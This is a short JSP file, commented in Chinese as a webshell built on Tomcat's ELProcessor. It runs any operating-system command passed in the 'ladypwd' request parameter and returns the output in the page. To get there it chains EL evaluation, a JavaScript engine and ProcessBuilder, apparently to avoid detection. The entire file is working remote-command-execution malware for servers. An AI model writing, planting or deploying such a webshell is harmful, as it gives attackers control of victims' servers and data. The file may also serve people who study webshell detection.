<%@ page import="javax.el.ELProcessor" %>
<%@ page import="java.io.BufferedReader" %>
<%@ page import="java.io.InputStreamReader" %>
<%@ page import="java.io.InputStream" %>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%--
利用Tomcat的ELProcessor#eval()实现JSP Webshell
--%>
<%
    StringBuilder sb = new StringBuilder();
    String cmd = request.getParameter("ladypwd");
    for (String tmp:cmd.split(" ")) {
        sb.append("'").append(tmp).append("'").append(",");
    }
    String f = sb.substring(0, sb.length() - 1);
    ELProcessor processor = new ELProcessor();
    Process p = (Process) processor.eval("" +
            "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\")." +
            "eval(\"new java.lang.ProcessBuilder['(java.lang.String[])'](["+ f +"]).start()\")");
    InputStream is = p.getInputStream();
    sb = new StringBuilder();
    BufferedReader br = new BufferedReader(new InputStreamReader(is));
    String line;
    while((line = br.readLine()) != null) {
        sb.append(line).append("\n");
    }
    out.print("<pre>");
    if (sb.length() > 0) {
        out.print(sb.toString());
    }
    out.print("</pre>");
%>
